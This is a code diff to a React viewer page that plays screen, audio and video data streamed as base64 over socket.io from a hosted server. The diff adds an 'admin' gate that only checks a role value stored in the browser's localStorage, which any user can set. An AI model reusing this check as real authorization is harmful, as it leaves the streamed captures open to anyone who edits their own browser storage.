@@ -1,5 +1,5 @@
 import React, { useEffect, useState, useRef } from "react";
-import { useParams } from "react-router-dom";
+import { useSearchParams, useNavigate } from "react-router-dom";
 import Navbar from "../components/Navbar";
 import { io } from "socket.io-client";
 
@@ -10,13 +10,24 @@ const socket = io("https://flask-1-usdt.onrender.com", {
 });
 
 const Viewer = () => {
-  const { type } = useParams();
+  const [params] = useSearchParams();
+  const navigate = useNavigate();
+  const type = params.get("type");
   const [screenData, setScreenData] = useState("");
   const audioQueue = useRef([]);
   const videoQueue = useRef([]);
   const audioRef = useRef(null);
   const videoRef = useRef(null);
 
+  // Role check
+  useEffect(() => {
+    const role = localStorage.getItem("role");
+    if (!role || role !== "admin") {
+      navigate("/");
+    }
+  }, []);
+
+  // Utility: base64 to Blob
   const base64ToBlob = (base64, mime) => {
     const byteChars = atob(base64);
     const byteArray = new Uint8Array(
@@ -25,7 +36,7 @@ const Viewer = () => {
     return new Blob([byteArray], { type: mime });
   };
 
-  // Audio
+  // Audio playback
   useEffect(() => {
     if (type !== "audio") return;
 
@@ -44,7 +55,7 @@ const Viewer = () => {
     return () => clearInterval(interval);
   }, [type]);
 
-  // Video
+  // Video frame render
   useEffect(() => {
     if (type !== "video") return;
 
@@ -78,7 +89,6 @@ const Viewer = () => {
 
     if (type === "video") {
       socket.on("video-data", (d) => {
-        console.log("🎥 Video-data received:", d);
         const base64 = typeof d === "string" ? d : d?.data || "";
         if (base64) videoQueue.current.push(base64);
       });
@@ -86,7 +96,6 @@ const Viewer = () => {
 
     if (type === "audio") {
       socket.on("audio-data", (d) => {
-        console.log("🔊 Audio-data received:", d);
         const chunk = d?.data || d;
         if (chunk) audioQueue.current.push(chunk);
       });
